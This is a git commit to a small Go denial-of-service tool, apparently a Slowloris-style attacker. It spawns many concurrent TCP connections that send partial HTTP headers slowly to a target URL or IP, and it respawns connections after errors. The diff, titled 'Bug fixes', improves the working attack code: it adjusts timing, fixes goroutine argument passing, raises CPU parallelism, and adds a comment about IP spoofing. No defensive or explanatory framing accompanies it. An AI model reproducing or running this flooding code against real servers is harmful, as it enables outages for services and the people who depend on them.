1ccceec4231b1d5160c68acbf142dcbe70bba66c
Austin Wilshire <awoldes@gmail.com>
2017-12-21 13:31:56 +1000

    Bug fixes

--- loris.go
+++ loris.go
@@ -4,17 +4,18 @@ import (
 	"net"
 	"os"
 	"fmt"
-	"io/ioutil"
 	"time"
 )
 
 func keepAlive(conn *net.TCPConn, addr string, port string, limit int, thread int, info string) {
+	time.Sleep(time.Second * 1)
 	_, err := conn.Write([]byte(info))
 	checkNetError(conn, addr, port, limit, thread, err)
-	time.Sleep(time.Second * 1)
 }
 
 func SpawnSocket(addr string, port string, limit int, thread int) {
+	time.Sleep(time.Second)
+	// Spoof IP addr - I don't care about a reply
 	combinedAddr := addr + ":" + port
 	tcpAddr, err := net.ResolveTCPAddr("tcp4", combinedAddr)
 	checkError(err)
@@ -28,8 +29,6 @@ func SpawnSocket(addr string, port string, limit int, thread int) {
 	keepAlive(conn, addr, port, limit, thread, userAgent)
 	host := "Host: " + addr + "\r\n\r\n"
 	keepAlive(conn, addr, port, limit, thread, host)
-	_, err = ioutil.ReadAll(conn)
-	checkError(err)
 	conn.Close()
 }
 
@@ -37,10 +36,10 @@ func OpenSocket(addr string, port string, limit int, thread int) {
 	fmt.Printf("Thread #%v open...\n", thread)
 	totalReqs := 0
 	for totalReqs <= limit {
-		SpawnSocket(addr, port, limit, thread)
 		totalReqs += 1
+		SpawnSocket(addr, port, limit, thread)
 		if totalReqs > limit {
-			fmt.Printf("Thread #%v done.\n", thread)
+			fmt.Printf("Thread #%v finished.\n", thread)
 		} else {
 			fmt.Printf("Respawning new connection on thread #%v...\n", thread)
 		}
@@ -49,15 +48,16 @@ func OpenSocket(addr string, port string, limit int, thread int) {
 
 func checkNetError(conn *net.TCPConn, addr string, port string, limit int, thread int, err error) {
     if err != nil {
-		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
-		conn.Close()
-		OpenSocket(addr, port, limit, thread)
+		fmt.Fprintf(os.Stderr, "\n\nFatal network error: %s\n\n", err.Error())
+		// conn.Close()
+		SpawnSocket(addr, port, limit, thread)
+		// OpenSocket(addr, port, limit, thread)
     }
 }
 
 func checkError(err error) {
     if err != nil {
-		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
+		fmt.Fprintf(os.Stderr, "\n\nFatal error: %s\n\n", err.Error())
         os.Exit(1)
     }
 }
--- main.go
+++ main.go
@@ -1,10 +1,10 @@
 package main
-
 import (
 	"fmt"
 	"flag"
 	"os"
 	"sync"
+	"runtime"
 )
 
 func printUsage() {
@@ -14,8 +14,11 @@ func printUsage() {
 }
 
 func main() {
+	runtime.GOMAXPROCS(4)
 	var defaultPort string = "80"
 	var defaultConnections int = 100
+
+	// This is limited by https://www.tecmint.com/increase-set-open-file-limits-in-linux/
 	var defaultLimit = 10
 
 	url := flag.String("u", "nil", "This is the url or IP to attack")
@@ -33,14 +36,15 @@ func main() {
 		panic("URL is required")
 	}
 
-	fmt.Printf("Blasting %v on port %v with %v concurrent connections\n", *url, *port, *connections)
+	fmt.Printf("Blasting %v on port %v with %v concurrent connections making %v requests each\n", *url, *port, *connections, *limit)
 	var wg sync.WaitGroup
 	for threads := 0; threads < *connections; threads++ {
 		wg.Add(1)
-		go func(){
+		go func(threads int){
+			// fmt.Println(threads)
 			OpenSocket(*url, *port, *limit, threads)
 			wg.Done()
-		}()
+		}(threads)
 	}
 	wg.Wait()
 	fmt.Printf("Finished requesting %v\n", *url)
